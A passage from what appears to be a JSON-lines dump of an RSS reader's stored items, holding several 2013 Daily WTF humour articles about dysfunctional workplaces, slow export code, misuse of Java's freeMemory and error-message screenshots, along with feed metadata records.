style='color:#000000; background:#ffffe8; '></span><span style='color:#000000; background:#ffffe8; '>    </span><span style='color:#797997; background:#ffffe8; '>$hour</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#808030; background:#ffffe8; '>=</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#008c00; background:#ffffe8; '>24</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#808030; background:#ffffe8; '>-</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#797997; background:#ffffe8; '>$hour</span><span style='color:#800080; background:#ffffe8; '>;</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#000000; background:#ffffe8; '>    </span><span style='color:#797997; background:#ffffe8; '>$ampm</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#808030; background:#ffffe8; '>=</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#0000e6; background:#ffffe8; '>\"PM\"</span><span style='color:#800080; background:#ffffe8; '>;</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#000000; background:#ffffe8; '>  </span><span style='color:#800080; background:#ffffe8; '>}</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#800000; background:#ffffe8; font-weight:bold; '>else</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#800080; background:#ffffe8; '>{</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#000000; background:#ffffe8; '>    </span><span style='color:#797997; background:#ffffe8; '>$ampm</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#808030; background:#ffffe8; '>=</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#0000e6; background:#ffffe8; '>\"AM\"</span><span style='color:#800080; background:#ffffe8; '>;</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#000000; background:#ffffe8; '>  </span><span style='color:#800080; background:#ffffe8; '>}</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#000000; background:#ffffe8; '>  </span><span style='color:#800000; background:#ffffe8; font-weight:bold; '>if</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#400000; background:#ffffe8; '>strlen</span><span style='color:#808030; background:#ffffe8; '>(</span><span style='color:#797997; background:#ffffe8; '>$hour</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#808030; background:#ffffe8; '>=</span><span style='color:#808030; background:#ffffe8; '>=</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#008c00; background:#ffffe8; '>1</span><span style='color:#808030; background:#ffffe8; '>)</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#797997; background:#ffffe8; '>$hour</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#808030; background:#ffffe8; '>=</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#0000e6; background:#ffffe8; '>\"0\"</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#808030; background:#ffffe8; '>.</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#797997; background:#ffffe8; '>$hour</span><span style='color:#800080; background:#ffffe8; '>;</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#000000; background:#ffffe8; '>  </span><span style='color:#800000; background:#ffffe8; font-weight:bold; '>return</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#797997; background:#ffffe8; '>$hour</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#808030; background:#ffffe8; '>.</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#0000e6; background:#ffffe8; '>\":\"</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#808030; background:#ffffe8; '>.</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#797997; background:#ffffe8; '>$min</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#808030; background:#ffffe8; '>.</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#0000e6; background:#ffffe8; '>\":\"</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#808030; background:#ffffe8; '>.</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#797997; background:#ffffe8; '>$sec</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#808030; background:#ffffe8; '>.</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#0000e6; background:#ffffe8; '>\" \"</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#808030; background:#ffffe8; '>.</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#797997; background:#ffffe8; '>$ampm</span><span style='color:#800080; background:#ffffe8; '>;</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#800080; background:#ffffe8; '>}</span><span style='color:#000000; background:#ffffe8; '></span><span style='color:#5f5035; background:#ffffe8; '>?></span></pre><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>. Pairing an easy-to-use web UI with a free base platform, BuildMaster gets you started in minutes. See how<a href=\"http://inedo.com/buildmaster/case-studies?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">Allrecipes.com and others</a>use BuildMaster to automate their software delivery.</div></div><div style=\"clear:both;\"></div><div class=\"feedflare\"><a href=\"http://syndication.thedailywtf.com/~ff/TheDailyWtf?a=VylRpkFEL18:Lfh5-aoHeME:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/TheDailyWtf?d=yIl2AUoC8zA\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/TheDailyWtf/~4/VylRpkFEL18\" height=\"1\" width=\"1\"/>","author":"Mark Bowytz","_id":{"$wrap":"$oid","v":904}}
{"k":"0000000082","o":"0000005639","v":"001"}
{"_id":905,"_uid":905,"_dt":1373729346503,"_s":"0e5b0c76ddf8023584bd0698045b2daf"}
{"subscription":{"$wrap":"$oid","v":54},"link":"http://thedailywtf.com/Articles/Documentation-by-Sticky-Note.aspx","title":"Documentation by Sticky Note","published":{"$wrap":"$date","v":1373280300000,"h":"2013-07-08T10:45:00.000Z"},"starred":false,"read":false,"content":"<p><strong>Anita</strong>parked outside the converted garage, the printed graphic reading Global Entertainment Strategies (GES) above it. When the owner, an old man named Brad, had offered her a position after spotting her in a student computer lab, she thought he was crazy, but a background check confirmed everything he said. Now she wondered if her first intuition was correct.</p><p>“Anita, welcome!” Brad seemed to bounce like a toddler as he showed Anita inside. The walls of the converted garage were bare drywall; the wall-mounted AC unit rattled and spat in the corner. In three corners of the office sat discount computer desks. Walls partitioned off Brad’s office in the fourth corner.</p><p>He practically shoved Anita into an unoccupied desk. The computer seemed to be running an unlicensed version of Windows 8, with no Office applications of any kind. “Ross can fill you in!” He left the office, slamming the door shut behind him.</p><p>“Hi.” Ross rolled in his chair from his desk to Anita’s. “Brad’s a little enthusiastic sometimes.”</p><p>“I noticed. Uh, he never told me what game we’re working on, or what platform. Not even a title.”</p><p>Ross’s voice lowered to a whisper. “None of us know, either. We’ve been coding in Unity for now. He hired you as a programmer, right? Well, right now we just need someone to manage our documentation. I suggest you prepare yourself.”</p><p>Ross led Anita into Brad’s office. Above a cluttered desk hung a sagging whiteboard. Every square inch was covered by one, sometimes several, overlapping sticky notes. Each had a word or two written in Brad’s scrawl.</p><p>“We need more than just random post-its with ‘big guns!’ and ‘more action!’” Ross said. “We don’t even know what the title is! We’re going crazy without some kind of direction.”</p><p>Anita stared at the wall of sticky notes, feeling her sanity slipping from her mind like a wet noodle. “I’ll try.”</p><h3>Sticky Escalation</h3><blockquote><pre>Brad, can we switch to Word for our documentation? It’s getting harderto read your handwriting, and there’s a lot of post-its that havenothing to do with the game. This will make it easier to proceed withdevelopment. -Anita</pre></blockquote><p>Two minutes after she sent the email, Brad barged out of his office. “Anita, why spend thousands of dollars on software licenses when this works just fine? If you can’t do your job with the tools you have, what kind of a programmer does that make you?”</p><p>“Brad, this isn’t going to work forever. Your whiteboard is almost out of room, and you won’t take down any of your non-game stickies!”</p><p>“I can’t take any of them down, Anita! Any of them!” He slammed the door to his office behind him.</p><p>The next day, Anita was greeted at the door by the enthusiastic Brad she had met before the interview. “I listened to reason, Anita. I hope this is enough for you to finish this documentation and get coding again!”</p><p>Brad led Anita into his office. On every wall surface, over the door, even covering part of the floor, were whiteboards. Sticky notes dotted nearly a third of the new whiteboard space.</p><p>“Now, Anita, if I don’t see new code from you soon, I may just have to let you go! Now get to work!”</p><p>Anita went to sit at her desk, then stopped. Instead, she grabbed a bright red sticky note, wrote the words “I QUIT” with a sharpy, barged into Brad’s office, and stuck it to his monitor. Brad was too stunned to talk as she left the converted garage.</p><h3>The Avalanche</h3><p>“Are you doing better?” Jason called Anita a few weeks later. Their short time together at GES has made them comrades-in-arms, and networking was crucial in the business.</p><p>“Much,” she said. “I got a real job with an indie developer in Santa Monica. We even have a wiki for our framework!”</p><p>“Well, listen to this. The day after you quit, the AC unit in the garage broke. I came into work to see Brad crying in a corner in his office. All of the sticky notes had curled in the humidity and fallen to the floor. The day after he got us all copies of Word.</p><p>“Too bad we still don’t know what the title of the game is.”</p><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>. Pairing an easy-to-use web UI with a free base platform, BuildMaster gets you started in minutes. See how<a href=\"http://inedo.com/buildmaster/case-studies?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">Allrecipes.com and others</a>use BuildMaster to automate their software delivery.</div></div><div style=\"clear:both;\"></div><div class=\"feedflare\"><a href=\"http://syndication.thedailywtf.com/~ff/TheDailyWtf?a=p1bXRJbieJc:je53GJfdkJQ:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/TheDailyWtf?d=yIl2AUoC8zA\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/TheDailyWtf/~4/p1bXRJbieJc\" height=\"1\" width=\"1\"/>","author":"Erik Gern","_id":{"$wrap":"$oid","v":905}}
{"k":"0000000082","o":"0000003793","v":"001"}
{"_id":906,"_uid":906,"_dt":1373729346507,"_s":"7dca9a1dfbbe8ea1b3642906389853b2"}
{"subscription":{"$wrap":"$oid","v":54},"link":"http://thedailywtf.com/Articles/Mistaken-Identity.aspx","title":"Error'd: Mistaken Identity","published":{"$wrap":"$date","v":1373019300000,"h":"2013-07-05T10:15:00.000Z"},"starred":false,"read":false,"content":"<p>\"You know, I kind of feel bad for the Visual Studio installer,\" writes<strong>Markus Schaber</strong></p><blockquote><p><a href=\"#Pic-1\"><img border=\"0\" alt=\"\" src=\"http://img.thedailywtf.com/images/13/q2/e72/Pic-1.png\" /></a></p><p> </p></blockquote><p><strong>Mike</strong>wrote, \"It seems that even though 'Restrict' is in the list of allowed options, Visual Studio still thinks that restrict is restricted.\"</p><blockquote><p><a href=\"#Pic-2\"><img border=\"0\" alt=\"\" src=\"http://img.thedailywtf.com/images/13/q2/e72/Pic-2.png\" /></a></p><p> </p></blockquote><p>\"I submitted a very innocent comment to a LiveJournal blog, and was given this response,\" writes<strong>Colin W.</strong>, \"If I was a spammer, I could regard this as a success, I guess.\"</p><blockquote><p><a href=\"#Pic-3\"><img border=\"0\" alt=\"\" src=\"http://img.thedailywtf.com/images/13/q2/e72/Pic-3.png\" /></a></p><p> </p></blockquote><p>\"My instance of Visual Studio had frozen up on me one Friday, so I decided to just go to lunch,\" wrote<strong>Michael U.</strong>, \"I came back to find quite a few notifications that Visual Studio was busy.\" (Click<a href=\"http://img.thedailywtf.com/images/13/q2/e72/Pic-4-Big.png\" target=\"_blank\">here</a>for the big version.)</p><blockquote><p><a href=\"#Pic-4\"><img border=\"0\" alt=\"\" src=\"http://img.thedailywtf.com/images/13/q2/e72/Pic-4.jpg\" /></a></p><p> </p></blockquote><p><strong>Germano</strong>remarks, \"I don't know what surprises me more - that Microsoft speaks Klingon, or that I actually can read it.\"</p><blockquote><p><a href=\"#Pic-5\"><img border=\"0\" alt=\"\" src=\"http://img.thedailywtf.com/images/13/q2/e72/Pic-5.jpg\" /></a></p><p> </p></blockquote><p>\"Oklahoma schools had to do a state mandated test of connection speeds recently, to allocate funding. The upstream could use some work, but the downstream probably won't get any improvements.,\" wrote<strong>George P.</strong></p><blockquote><p><a href=\"#Pic-6\"><img border=\"0\" alt=\"\" src=\"http://img.thedailywtf.com/images/13/q2/e72/Pic-6.jpg\" /></a></p><p> </p></blockquote><p>\"I got this great error message from Illustrator when trying to quit - perhaps a better error message is<i>WON'T</i>?,\"<strong>Andrew G.</strong>remarked.</p><blockquote><p><a href=\"#Pic-7\"><img border=\"0\" alt=\"\" src=\"http://img.thedailywtf.com/images/13/q2/e72/Pic-7.jpg\" /></a></p><p> </p></blockquote><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>. Pairing an easy-to-use web UI with a free base platform, BuildMaster gets you started in minutes. See how<a href=\"http://inedo.com/buildmaster/case-studies?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">Allrecipes.com and others</a>use BuildMaster to automate their software delivery.</div></div><div style=\"clear:both;\"></div><div class=\"feedflare\"><a href=\"http://syndication.thedailywtf.com/~ff/TheDailyWtf?a=PMx4C5CWGng:f57coS8tNlA:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/TheDailyWtf?d=yIl2AUoC8zA\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/TheDailyWtf/~4/PMx4C5CWGng\" height=\"1\" width=\"1\"/>","author":"Mark Bowytz","_id":{"$wrap":"$oid","v":906}}
{"k":"0000000082","o":"0000006128","v":"001"}
{"_id":907,"_uid":907,"_dt":1373729346511,"_s":"d35640c7a239669dc39770415dc902eb"}
{"subscription":{"$wrap":"$oid","v":54},"link":"http://thedailywtf.com/Articles/The-Speed-of-Progress.aspx","title":"The Speed of Progress","published":{"$wrap":"$date","v":1372759200000,"h":"2013-07-02T10:00:00.000Z"},"starred":false,"read":false,"content":"<p><strong>Eric</strong>had not expected to be put into this position. He had been an annual visitor to Comicon for the past decade, but when they ran into trouble with the audio right before the \"Big Bang Theory\" cast panel, he just happened to be the right person in the right place at the right time. Working furiously to get the cabling back together, he was surprised the gentle tap on his shoulder. Turning around, he found himself face-to-face with Kaley Cuoco.</p><p>\"Thanks soooo much for your help\", she cooed.</p><p>\"N-N-No problem\", Eric stuttered. \"Happy to be able to help out\"</p><p>Turning back to the console, Eric refocused. Was that a hand he still felt resting lightly on his back?</p><p>And that faint music. Getting lounder. It was almost...no, it<strong>was</strong>the sound of the Barenaked Ladiea.</p><p>Groggily, Eric rolled over in his bed and reached for the cell phone that was ringing on the night stand.</p><p>\"Yeah?\"</p><p>\"Eric, it's Trevor. We've been running into a problem since that patch to the exporting program was put in over the weekend. It has been slowly getting worse over the weekend, but now that Europe is starting to come on-line, it's become an emergency.\"</p><p>An emergency, thought Eric? Yeah, sure. Then why wasn't it an emergency yesterday evening.</p><p>Still Eric went over to his desk, flipped on his computer and started digging. Naturally, the first place to look was where stuff had just been changed.</p><p>When not saving geek conferences, Eric worked for a phone company that keeps custom audio from their customers in giant wave files. And for him, 'giant' meant around 200-700MB. These wave files contained custom prompts created by their customers in an audio format. Associated with each of these wave files is a text file containing metadata about the number and content of the prompts encoded in the audio format.</p><p>When a wave file was imported into the application, it would break the wave file into a large number of 20MB chunks. These chunks were easier to manage (not to mention being able to ZIP up and send around by email, if needed). The file names related to these chunks were included in the text-based metadata. On export, the metadata file would be read, the chunks located and put back together into one big file.</p><p>However, thanks to a change in the export process, the 'de-chunkifying' was taking much longer than before. When one told the program to export, it would hang for about eight seconds, and then pop up a progress bar and chug away for about four more seconds. And the only change seemed to be the addition of that progress bar. Putting aside the WTF-ness of waiting two-thirds of the way into a process to even start the progress bar, the timing seemed odd to Eric.</p><p>Seeing no other significant modifications, Eric drilled into the code surrounding the progress bar. The import was split into three steps.  First it loads the audio metadata from the text file. Next it uses a function to check the total sizes of the audio 'chunks' (to more accurately inform the user of the progress). Finally, the progress bar was displayed and the exported file created.  Thinking it was strange that the first two parts took 8 seconds while the real work took only four, Eric went further into the code.</p><p>What he saw was that the time before the progress bar was spent almost entirely in the function checking the file sizes. Now knowing where to look, Eric quickly scanned through the file sizing code. As it turns out, rather than measuring the file size, it was measuring the audio size. Which required it to open, read, and process the header of each and every 20MB wave file.</p><p>Given the criticalness of the accuracy of the progress bar (yes, he was familiar with how precise Microsoft always got with their progress indicators), Eric altered the progress bar procedure to use the number of chunks in the text file rather than the combined size of the audio chunks as it's metric. All of a sudden, the progress bar was almost instantaneously available and the entire exporting process took 4 seconds. Looking a little further into the code, he discovered that the updates to the progress bar were being made with ever 200B read from the file. By increasing that to 4MB he cut another 3 seconds off the process. Yes, yes the cost was less accuracy. Sue him.</p><p>Eric pushed the changes into the master branch and relaxed back into his chair while waiting for the build to run.</p><p>\"Oh Eric,\", said Kaley as she leaned closer, \"you're soooo awesome.\" The kiss was soft and moist.</p><p>The ping of an incoming notification brought Eric back to consciousness. And the only blonde in sight was the cocker spaniel licking drool off of his face.</p><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>. Pairing an easy-to-use web UI with a free base platform, BuildMaster gets you started in minutes. See how<a href=\"http://inedo.com/buildmaster/case-studies?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">Allrecipes.com and others</a>use BuildMaster to automate their software delivery.</div></div><div style=\"clear:both;\"></div><div class=\"feedflare\"><a href=\"http://syndication.thedailywtf.com/~ff/TheDailyWtf?a=BqZTva0MxuM:y_AKJVfJqUI:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/TheDailyWtf?d=yIl2AUoC8zA\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/TheDailyWtf/~4/BqZTva0MxuM\" height=\"1\" width=\"1\"/>","author":"Bruce Johnson","_id":{"$wrap":"$oid","v":907}}
{"k":"0000000082","o":"0000004086","v":"001"}
{"_id":908,"_uid":908,"_dt":1373729346516,"_s":"efaadbd9c05bbec7fab1f644f897a80c"}
{"subscription":{"$wrap":"$oid","v":54},"link":"http://thedailywtf.com/Articles/Running-for-Free-Memory.aspx","title":"CodeSOD: Running for Free Memory","published":{"$wrap":"$date","v":1372156200000,"h":"2013-06-25T10:30:00.000Z"},"starred":false,"read":false,"content":"<p><strong>Jon</strong>checked the source control system and discovered a recent check-in by a new-hire touched nearly<em>every</em>file. The check-in comment read,“Performance enhancements; reduced memory usage.”</p><pre style='color:#000000;background:#ffffff;'>Runtime runny = Runtime.getRuntime();runny.freeMemory();<span style='color:#3f7f59; '>//performance</span><span style='color:#3f7f59; '>/* Add the allocation level information */</span>TxnMaker tm =<span style='color:#7f0055; font-weight:bold; '>new</span>TxnMaker(txnId, buySell, rate, taxFlag, isForeign, map);xmlMessage.getTxns().addAll(tm.getTxns());runny.freeMemory();<span style='color:#3f7f59; '>//performance</span>Log.writeTrace(<span style='color:#2a00ff; '>\"</span><span style='color:#2a00ff; '>Txns built</span><span style='color:#2a00ff; '>\"</span>);TxnGroupMaker gm =<span style='color:#7f0055; font-weight:bold; '>new</span>TxnGroupMaker(txnId, buySell, rate, spanishTaxFlag, isForeign, map);Log.writeTrace(<span style='color:#2a00ff; '>\"</span><span style='color:#2a00ff; '>Txn Groups Built</span><span style='color:#2a00ff; '>\"</span>);gm.smoothAllEconomicFields(tm.getAllocations(), map, isForeign);xmlMessage.getTxnGroups().addAll(gm.getTxnGroups());runny.freeMemory();<span style='color:#3f7f59; '>//performance</span></pre><!-- \"Well son,\" asked the father, \"have you thought about what you want to be when you grow up?\"\"A garbage collector,\" little Timmy replied.\"That's a strange ambition for a career. Why do you want to do a job like that?\"\"Because garbage collectors only work on Tuesdays!\" --><p>The<code>runny.freeMemory()</code>lines now dotted the code base like crab grass. The new-hire hoped to reduce the memory footprint by forcing garbage collection. At the same time, he could reduce the overall performance of the application by forcing the whole application to wait for the garbage collector to grind through allocated memory.</p><p>The good news: the developer failed to fail. The method<code>freeMemory</code>doesn’t do what the new-hire thought it did. From the Javadoc:</p><blockquote><p>long java.lang.Runtime.freeMemory()<br/>Returns the amount of free memory in the<span onclick=\"cornify_add();return false;\" title=\"click me!\">Java Virtual Machine</span><script type=\"text/javascript\" src=\"http://www.cornify.com/js/cornify.js\"></script>. Calling the gc method may result in increasing the value returned by freeMemory.<br/>Returns: an approximation to the total amount of memory currently available for future allocated objects, measured in bytes.</p></blockquote><!-- Easy Reader Version: The rare case where someone aimed at a WTF, missed, and WTFed more spectacularly than ever! --><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>. Pairing an easy-to-use web UI with a free base platform, BuildMaster gets you started in minutes. See how<a href=\"http://inedo.com/buildmaster/case-studies?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">Allrecipes.com and others</a>use BuildMaster to automate their software delivery.</div></div><div style=\"clear:both;\"></div><div class=\"feedflare\"><a href=\"http://syndication.thedailywtf.com/~ff/TheDailyWtf?a=vGHk3Nn0-jE:I0qQ6yPNx9I:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/TheDailyWtf?d=yIl2AUoC8zA\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/TheDailyWtf/~4/vGHk3Nn0-jE\" height=\"1\" width=\"1\"/>","author":"Remy Porter","_id":{"$wrap":"$oid","v":908}}
{"k":"0000000082","o":"0000007786","v":"001"}
{"_id":909,"_uid":909,"_dt":1373729346519,"_s":"27a915199da4f445870eec2e96aabcf6"}
{"subscription":{"$wrap":"$oid","v":54},"link":"http://thedailywtf.com/Articles/Classic-WTF-Java-is-Slow!.aspx","title":"Classic WTF: Java is Slow!","published":{"$wrap":"$date","v":1372933800000,"h":"2013-07-04T10:30:00.000Z"},"starred":false,"read":false,"content":"<p>It's Independence Day for us folks here in the US, so to mark the occasion, here's a Classic WTF!</p><p><hr></p><p style=\"margin-top: 0px\"><img class=\"wtf_imgfloatright\" style=\"float: right; margin: 5px\" alt=\"Woof.\" src=\"http://img.thedailywtf.com/images/mark/java_slow.jpg\" /><strong>Pete</strong>and his manager Dick were ACME Corporation's version of<i>The Odd Couple</i>. They both shared in the support and maintenance of a monstrous in-house spawned order processing / network monitoring / invoice printing / slashy / slash / slash system written in Visual C++. However, while Pete kept up in the latest technology trends and was always on the lookout for new solutions to old problems, Dick was a very conservative manager with twenty-five company years under his belt. To Dick,\"change\" was only a Good Thing when it added up to 65¢, which was the exact amount required to buy a ginger ale from the soda machine. What kept Pete and Dick from being a perfect couple was that Dick was Pete's supervisor and often times, he got his way.</p><p style=\"margin-top: 0px\">Back in the late-90's, Pete had caught wind of some\"Java\" thing starting to pick up steam. When comparing features, he found that many of the kludgy, half-hearted attempts at a supportable solution they developed would have been scads easier to do using Java. Intrigued at the prospect of a better codebase that took less to develop, Pete coded up a new modules in Java as a proof of concept. For a prototype, it seemed to work well. That is, until it hit a roadblock named Dick. You see, Dick had heard about Java, too.</p><p>\"You're a developer, not a hacker,\" Dick ranted after being shown the Java prototype,\"we already have the right tools for the job at our hands. Anything that must be run as bytecode through a<em>virtual</em>machine will always be ten times slower!\"</p><h3 style=\"margin-bottom: 0px\">Order Jamming</h3><p style=\"margin-top: 0px\">As the years past by, Dick continued to have misgivings about Java. Whenever someone said the word\"Java\", his knee-jerk reaction was<em>*cough*virtualmachine*cough*</em>. As developers from other teams began using Java tools for themselves, he'd shake his head, roll his eyes back, and eagerly await the first opportunity to say\"told you so\" if anything unexpected occurred. Even something as little as a typo.</p><p style=\"margin-top: 0px\">Not all Java encounters, however, ended with just an eyeroll. One day, after being impacted by a\"major Java failure\" in another department's application, Dick dished out some full-fledged, beat-in-the-face, you'll-be-lucky-if-you-have-a-job-in-the-mailroom-once-I'm-through-with-you anger to one of the lead developer in the other group. And for good reason: the application in question was a J2EE-based order processing system that used Oracle databases and Enterprise Java Beans. That fell directly into the crosshairs of Dick's anti-Java artillery.</p><p style=\"margin-top: 0px\">Curious as to the technical details of the failure, Pete inquired with the developer. The problem, as he explained, occurred in the middle of a seasonal heavy volume period where the number of orders per second peaked into the hundreds. During that time, it took several minutes to complete a transaction, making the performance comparable to that of a crusty old 486. Dick had of predictably blamed Java.</p><p style=\"margin-top: 0px\">\"Had it always buckled under the pressure?\" Pete asked.</p><p style=\"margin-top: 0px\">\"No,\" replied the colleague,\"we're on Version 3 of the system; it's not like they had gained thousands of customers overnight.\"</p><p style=\"margin-top: 0px\">\"So what happened recently to make things so bad?\" asked Pete.</p><p style=\"margin-top: 0px\">\"Dick happened.\"</p><p style=\"margin-top: 0px\">Previously, the system had used a message queue system to pass data between it and the big server in the Financials group. However, now, every single transaction was saved off to a custom table in the database, dumped to a common directory on Unix, and then were transferred out by a cron job via FTP. Pete asked why on earth they were writing the transactions to text files.</p><p style=\"margin-top: 0px\">\"That's most likely what's slowing the whole thing down so much,\" the developer explained.\"Dick insisted that, if we were to interface with your system, then we'd have to write everything to text files for reliability. He likes to have the data around where he can see it. To the best that we can tell, he just didn't trust the whole Java and database thing.\"</p><p style=\"margin-top: 0px\">Though\"Javagate\" didn't have the outcome that Dick had hoped— having the mature order processing system be scrapped in favor of something a little lower in the alphabet than\"J\"— he still remained bitter about technology.</p><h3 style=\"margin-bottom: 0px\">A Sure Thing!</h3><p style=\"margin-top: 0px\">Because of ACME's expertise in building specialized logistical software, a Norwegian company named FooNorsk sent some suit n' tie guys to probe ACME for a really big thing: they had just won a government contract to automate the transportation of passengers around the whole country and wanted ACME to develop some parts of the system.</p><p>The system would be responsible for tracking all the vehicles (trains, buses and boats) using GPS, automatically planning all the schedules, coordinating different transportation systems, solving problems due to service interruptions, delays, etc. It was slated to be installed in a big server farm near Oslo and require hundreds of servers to run. Oh, and it was to be based in J2EE.</p><p style=\"margin-top: 0px\">Pete and Dick attended some meetings with the tall, Viking-looking guys. In a break for coffee, Pete was talking with FooNorsk's main engineer about how ACME had done plenty of Java based projects and had so much expertise in the subject.</p><p style=\"margin-top: 0px\">When the meeting resumed, the discussion went about some more technical details. Dick then sealed the fate of the meeting with these killer sentences:</p><p style=\"margin-top: 0px\">\"So, your system is made in Java? We don't use any Java around here, it's just too slow. It has no use in our line of business. Why don't you use C++ instead?\"</p><p style=\"margin-top: 0px\">Needless to say, the contract was lost in that precise moment.</p><h3> </h3><div style=\"margin:10px;padding:5px;background-color:#eee;\"><div style=\"min-height:45px\"><img src=\"http://thedailywtf.com/tizes/ads/inedo40x40.png\" style=\"display:block;float:left;margin-right:4px;\">[Advertisement]<b>Make your team a DevOps team with<a href=\"http://inedo.com/?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">BuildMaster</a></b>. Pairing an easy-to-use web UI with a free base platform, BuildMaster gets you started in minutes. See how<a href=\"http://inedo.com/buildmaster/case-studies?utm_source=tdwtf&utm_medium=afooter&utm_campaign=tdwtf13q1\">Allrecipes.com and others</a>use BuildMaster to automate their software delivery.</div></div><div style=\"clear:both;\"></div><div class=\"feedflare\"><a href=\"http://syndication.thedailywtf.com/~ff/TheDailyWtf?a=0e1VQpP6qnQ:1QNujOFop-k:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/TheDailyWtf?d=yIl2AUoC8zA\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/TheDailyWtf/~4/0e1VQpP6qnQ\" height=\"1\" width=\"1\"/>","author":"Mark Bowytz","_id":{"$wrap":"$oid","v":909}}
{"k":"0000000082","o":"0000004233","v":"001"}
{"_id":910,"_uid":910,"_dt":1373729346525,"_s":"738acc7c2960a04740f0914544bbdd05"}
